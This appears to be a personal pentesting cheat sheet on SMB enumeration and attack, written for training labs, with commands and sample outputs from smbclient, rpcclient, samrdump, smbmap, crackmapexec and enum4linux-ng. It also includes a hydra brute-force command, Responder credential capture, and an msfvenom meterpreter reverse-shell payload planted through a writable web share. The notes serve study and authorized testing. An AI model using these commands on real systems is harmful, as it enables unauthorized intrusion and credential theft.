## SMB
Server Message Block

### Info
- can be enumerated with nmap scripts

### Versions
- **SMB1**: Very old, not secure and should be disabled. 
  - Attacks: (EternalBlue, EternalRomance, EternalSynergy, EternalChampion, EternalRock, SambaCry, WannaCry, Petya, NotPetya, etc.)

- **SMB2**: Introduced in Windows Vista and Windows Server 2008. Less chatty. Guest access is disabled by default.
- **SMB3**: Introduced in Windows 8 and Windows Server 2012. Most secure. Uses AES encryption. Need User authentication.

### Ports And Infos:
- **Port 139**: SMB1, NetBIOS Session Service
  - SMB1 Hostname must be provided \\host1\files
- **Port 445**: SMB1 and SMB2 Microsoft-DS \\ Active Directory, Windows shares, etc.
  - can use IP address \\192.193.1.231\files

### Enumerated by tools:
- **enum4linux**: Enumerates SMB shares on Windows and Linux systems.
- Nmap scripts: smb-enum-shares, smb-enum-users, smb-os-discovery, smb-security-mode, smb-vuln-*, etc.
- smbclient: Command-line tool to access SMB shares.
- rpcclient: Command-line tool to access Windows RPC services.

### Common Shares:
- **IPC$**: Inter-Process Communication share.
- **C$**: Drive C. of the remote host
- **Admin$**: Access to the Windows folder.

if ipc is available you can do for example: eternalblue

### To Try in Pentesting:
- Can i acces SMB as guest?
- Can I bruteforce usernames/ passwords
- Can I read/write to shares?
- Can I access my written file to execute shells?

### SMB Responder: 

-I choose network interface (In the context of Responder, 

```sh
git clone https://github.com/lgandx/Responder
```
Verify that the Responder.conf is set to listen for SMB requests.

edit resolver conf if necessary

```sh
cat Responder.conf
```
```
sudo python3 Responder.py -I tun0

Specifying -I tun0 means that Responder will listen for network requests coming through the tun0 interface. 
This could be useful if you're running Responder on a system that's connected to a VPN, 
and you want Responder to only interact with network traffic that's coming over the VPN connection.)

```
server is now listening


### SMBClient

#### Options
-L : List available shares on the target.

-U : Login identity to use.

Onfound username:
$ = Signalised t

#### Installation
```sh
sudo apt install smbclient
```


#### Commands
```sh 
get "flag.txt" #to get the flag
```

#### Examples
```sh
smbclient  -N -L 10.129.206.31
#-N : No password
#-L : This option allows you to look at what services are available on a server
smbclient -N \\\\ 10.129.253.64\\backups #anonamous access to backups
smbclient //10.129.253.64/sambawshare #normal acces to a share
smbclient -L 10.129.206.31 -U Administrator

smbclient \\\\10.129.206.31\\ADMIN$ -U Administrator #with folder ADMIN$
smbclient \\\\10.129.206.31\\AC$ -U Administrator #with folder C
```

### RPC Client
Can also use as cli for smb

opens a shell
```shell
queryuser 500 #administrator infos
queryuser 1000 #first User on machine
```

### Bruteforce access

```shell
#this can take long
hydra -l IEUSER -P /usr/share/wordlists/rockyou.txt smb #bruteforce smb
```

### Nmap with SMB Username and password
This delivers more details in enumeration
```shell
nmap -script smb-enum* --script-args smbusername=IEUSER,smbpass=Password$ -p445 192.254.1.102
```

### Tipps in pentesting
- If folder is webfolder maybe possible to put files there via some smb user
- typically somethink like **wwwroot**

## Reverse Shell over SMB:
1. Create reverse shell with msfvenom
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.254.1.229 LPORT=4444 -f asp > shell.asp
```
2. That creates an asp shell script which can be
3. Accepting the shell with metasploit:
```shell
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.254.1.228; set lport 4444; run -j"
```
4. Put  the shell.asp in webfolder of the smb share.
5. Than open it in browser to execute the shell.


## SMB Footprinting / Enumeration

```shell
#nmap
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse  10.129.253.64  #enumerates shares and users
sudo nmap 10.129.253.64 -sV -sC -p139,445
```
### rpcclient
```shell
rpcclient -U "" 10.129.253.64

rpcclient $> srvinfo
        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
        
rpcclient $> enumdomains
  name:[DEVSMB] idx:[0x0]
  name:[Builtin] idx:[0x1]

rpcclient $> querydominfo
  Domain:         DEVOPS
  Server:         DEVSMB
  Comment:        DEVSM
  Total Users:    2
  Total Groups:   0
  Total Aliases:  0
  Sequence No:    1632361158
  Force Logoff:   -1
  Domain Server State:    0x1
  Server Role:    ROLE_DOMAIN_PDC
  Unknown 3:      0x1

rpcclient $> netshareenumall
  netname: print$
          remark: Printer Drivers
          path:   C:\var\lib\samba\printers
          password:
  netname: home
          remark: INFREIGHT Samba
          path:   C:\home\
          password:
  netname: dev
          remark: DEVenv
          path:   C:\home\sambauser\dev\
          password:
  netname: notes
          remark: CheckIT
          path:   C:\mnt\notes\
          password:
  netname: IPC$
          remark: IPC Service (DEVSM)
          path:   C:\tmp
          password:
          
rpcclient $> netsharegetinfo notes
  netname: notes
          remark: CheckIT
          path:   C:\mnt\notes\
          password:
          type:   0x0
          perms:  0
          max_uses:       -1
          num_uses:       1
  revision: 1
  type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
  DACL
          ACL     Num ACEs:       1       revision:       2
          ---
          ACE
                  type: ACCESS ALLOWED (0) flags: 0x00 
                  Specific bits: 0x1ff
                  Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                  SID: S-1-1-0
                  
rpcclient $> enumdomusers
  user:[mrb3n] rid:[0x3e8]
  user:[cry0l1t3] rid:[0x3e9]
  

rpcclient $> queryuser 0x3e8
        User Name   :   mrb3n
        Full Name   :
        Home Drive  :   \\devsmb\mrb3n
        Dir Drive   :
        Profile Path:   \\devsmb\mrb3n\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
        
rpcclient $> querygroup 0x201
        Group Name:     None
        Description:    Ordinary Users
        Group Attribute:7
        Num Members:2
```
#### Bruteforcing User Ids:
```shell
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.253.64 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
     
        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

### Impacket Samrdump.py
```shell
samrdump.py 10.129.14.128
  
  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
  
  [*] Retrieving endpoint list from 10.129.14.128
  Found domain(s):
   . DEVSMB
   . Builtin
  [*] Looking up users in domain DEVSMB
  Found user: mrb3n, uid = 1000
  Found user: cry0l1t3, uid = 1001
  mrb3n (1000)/FullName: 
  mrb3n (1000)/UserComment: 
  mrb3n (1000)/PrimaryGroupId: 513
  mrb3n (1000)/BadPasswordCount: 0
  mrb3n (1000)/LogonCount: 0
  mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
  mrb3n (1000)/PasswordDoesNotExpire: False
  mrb3n (1000)/AccountIsDisabled: False
  mrb3n (1000)/ScriptPath: 
  cry0l1t3 (1001)/FullName: cry0l1t3
  cry0l1t3 (1001)/UserComment: 
  cry0l1t3 (1001)/PrimaryGroupId: 513
  cry0l1t3 (1001)/BadPasswordCount: 0
  cry0l1t3 (1001)/LogonCount: 0
  cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
  cry0l1t3 (1001)/PasswordDoesNotExpire: False
  cry0l1t3 (1001)/AccountIsDisabled: False
  cry0l1t3 (1001)/ScriptPath: 
  [*] Received 2 entries.
```

### SMBMap:
```shell
smbmap -H 10.129.14.128

[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        home                                                    NO ACCESS       INFREIGHT Samba
        dev                                                     NO ACCESS       DEVenv
        notes                                                   NO ACCESS       CheckIT
        IPC$                                                    NO ACCESS       IPC Service (DEVSM)
```

### CrackMapExec:
```shell
detau@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''

SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```

### Enum4Linux-ng

#### Installation
```shell
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

#### Enumeration

```shell
./enum4linux-ng.py 10.129.14.128 -A

.... very big output
```